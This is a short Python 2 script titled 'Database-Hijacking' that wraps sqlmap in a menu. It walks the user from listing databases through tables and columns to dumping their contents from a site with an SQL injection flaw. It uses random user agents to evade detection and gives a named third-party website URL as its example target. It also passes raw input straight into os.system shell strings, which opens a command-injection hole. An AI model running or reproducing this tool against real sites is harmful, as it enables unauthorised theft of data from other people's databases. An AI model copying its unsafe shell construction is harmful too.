#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

os.system("sudo apt-get install figlet")
os.system("sudo apt-get install sqlmap")
os.system("clear")
os.system("figlet Database-Hijacking Berk")
print("""
\033[1;33;40m Before starting database operations, choose one that you need;

1) I only have the link with vulnerability.
2) I do have the link and also the database name.
3) I do have the link, database name and also the table/s name.
4) I do have the link, database name, tables name and the column/s name.

\033[1;33;40m Example to a link with includes vulnerability; http://www.suesupriano.com/article.php?id=25
""")

operno = raw_input("Operation number: ")

if operno == '1':
	vulnlink = raw_input("Type the link that includes vulnerability: ")
	os.system("sqlmap -u " + vulnlink + " --dbs --random-agent")
	
elif operno == '2':
	vulnlink = raw_input("Type the link that includes vulnerability: ")
	database = raw_input("Database name: ")
	os.system("sqlmap -u " + vulnlink + " -D " + database + " --tables --random-agent")
	
elif operno == '3':
	vulnlink = raw_input("Type the link that includes vulnerability: ")
	database = raw_input("Database name: ")
	table = raw_input("Table/s name: ")
	os.system("sqlmap -u " + vulnlink + " -D " + database + " -T " + table + " --columns --random-agent")
	
elif operno == '4':
	vulnlink = raw_input("Type the link that includes vulnerability: ")
	database = raw_input("Database name: ")
	table = raw_input("Table/s name: ")
	column = raw_input("Column/s name: ")
	os.system("sqlmap -u " + vulnlink + " -D " + database + " -T " + table + " -C " + column + " --dump --random-agent")
	
else:
	print("An error occurred. Please try again.")
